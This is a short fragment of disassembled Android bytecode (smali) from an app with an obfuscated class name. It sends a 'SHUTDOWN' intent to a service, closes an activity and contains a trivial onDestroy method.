    const-string v0, "ginom.alfa.lib.scan.SHUTDOWN"

    .line 244
    invoke-virtual {p1, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    .line 247
    invoke-virtual {p0, p1}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 248
    invoke-virtual {p0}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->finish()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_4

    :catch_4
    :cond_16
    :goto_c
    return-void
.end method

.method protected onDestroy()V
    .locals 0

    .line 36
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method
